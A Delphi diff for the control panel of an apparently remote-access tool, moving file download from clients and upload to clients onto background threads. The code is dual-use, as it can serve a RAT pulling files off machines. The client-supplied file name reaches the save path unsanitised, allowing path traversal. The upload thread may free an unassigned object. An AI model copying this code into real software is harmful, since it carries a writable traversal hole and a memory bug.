@@ -247,31 +247,49 @@ begin
   end
   else if SameText(Action, 'download') then
   begin
-    var FileName := JSONObj.Values['name'].Value;
-    var Base64Data := JSONObj.Values['data'].Value;
-    var RawData: TBytes;
-    var SavePath: string;
+    var JSONClone := TJSONObject(JSONObj.Clone);
+    TThread.CreateAnonymousThread(
+      procedure
+      var
+        FileName, Base64Data, SavePath: string;
+        RawData: TBytes;
+        MS: TMemoryStream;
+      begin
+        try
+          FileName := JSONClone.Values['name'].Value;
+          Base64Data := JSONClone.Values['data'].Value;
 
-    RawData := TNetEncoding.Base64.Decode(TEncoding.UTF8.GetBytes(Base64Data));
-    SavePath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
-    SavePath := TPath.Combine(SavePath, FClientID);
-    SavePath := TPath.Combine(SavePath, 'recovery_files');
+          RawData := TNetEncoding.Base64.Decode(TEncoding.UTF8.GetBytes(Base64Data));
 
-    if not TDirectory.Exists(SavePath) then
-      TDirectory.CreateDirectory(SavePath);
+          if Length(RawData) > (50 * 1024 * 1024) then
+          begin
+            TThread.Queue(nil, procedure begin LogToStatus('Download failed: Exceeds 50MB'); end);
+            Exit;
+          end;
 
-    SavePath := TPath.Combine(SavePath, FileName);
+          SavePath := TPath.Combine(ExtractFilePath(ParamStr(0)), 'Clients Folder');
+          SavePath := TPath.Combine(SavePath, FClientID);
+          SavePath := TPath.Combine(SavePath, 'recovery_files');
 
-    var MS := TMemoryStream.Create;
-    try
-      if Length(RawData) > 0 then
-        MS.WriteBuffer(RawData[0], Length(RawData));
-      MS.SaveToFile(SavePath);
-    finally
-      MS.Free;
-    end;
+          if not TDirectory.Exists(SavePath) then
+            TDirectory.CreateDirectory(SavePath);
 
-    LogToStatus('Downloaded: ' + FileName);
+          SavePath := TPath.Combine(SavePath, FileName);
+
+          MS := TMemoryStream.Create;
+          try
+            if Length(RawData) > 0 then
+              MS.WriteBuffer(RawData[0], Length(RawData));
+            MS.SaveToFile(SavePath);
+          finally
+            MS.Free;
+          end;
+
+          TThread.Queue(nil, procedure begin LogToStatus('Downloaded: ' + FileName); end);
+        finally
+          JSONClone.Free;
+        end;
+      end).Start;
   end;
 end;
 
@@ -496,10 +514,8 @@ end;
 
 procedure TForm9.Upload1Click(Sender: TObject);
 var
-  JSONObj: TJSONObject;
   OpenDlg: TOpenDialog;
-  FileBytes: TBytes;
-  Base64Str: string;
+  LocalPath, RemotePath: string;
 begin
   if not Assigned(FOnSendJSON) or not Assigned(FLine) then Exit;
 
@@ -507,26 +523,49 @@ begin
   try
     if OpenDlg.Execute then
     begin
-      if TFile.GetSize(OpenDlg.FileName) > (50 * 1024 * 1024) then
+      LocalPath := OpenDlg.FileName;
+      RemotePath := IncludeTrailingPathDelimiter(FCurrentPath) + TPath.GetFileName(LocalPath);
+
+      if TFile.GetSize(LocalPath) > (50 * 1024 * 1024) then
       begin
         MessageBox(Handle, 'File size exceeds 50MB limit.', 'Upload Error', MB_OK or MB_ICONERROR);
         Exit;
       end;
 
-      FileBytes := TFile.ReadAllBytes(OpenDlg.FileName);
-      Base64Str := TNetEncoding.Base64.EncodeBytesToString(FileBytes);
-      Base64Str := Base64Str.Replace(#13, '').Replace(#10, '');
+      LogToStatus('Uploading: ' + TPath.GetFileName(LocalPath) + '...');
 
-      JSONObj := TJSONObject.Create;
-      try
-        JSONObj.AddPair('action', 'uploadfile');
-        JSONObj.AddPair('path', IncludeTrailingPathDelimiter(FCurrentPath) + TPath.GetFileName(OpenDlg.FileName));
-        JSONObj.AddPair('data', Base64Str);
-        FOnSendJSON(FLine, JSONObj);
-        StatusBar1.SimpleText := 'Uploading: ' + TPath.GetFileName(OpenDlg.FileName);
-      finally
-        JSONObj.Free;
-      end;
+      TThread.CreateAnonymousThread(
+        procedure
+        var
+          FileBytes: TBytes;
+          Base64Str: string;
+          JSONObj: TJSONObject;
+        begin
+          FileBytes := TFile.ReadAllBytes(LocalPath);
+          Base64Str := TNetEncoding.Base64.EncodeBytesToString(FileBytes);
+          Base64Str := Base64Str.Replace(#13, '').Replace(#10, '');
+
+          JSONObj := TJSONObject.Create;
+          try
+            JSONObj.AddPair('action', 'uploadfile');
+            JSONObj.AddPair('path', RemotePath);
+            JSONObj.AddPair('data', Base64Str);
+
+            TThread.Queue(nil,
+              procedure
+              begin
+                try
+                  if Assigned(FOnSendJSON) and Assigned(FLine) then
+                    FOnSendJSON(FLine, JSONObj);
+                finally
+                  JSONObj.Free;
+                end;
+              end);
+          except
+            JSONObj.Free;
+            raise;
+          end;
+        end).Start;
     end;
   finally
     OpenDlg.Free;
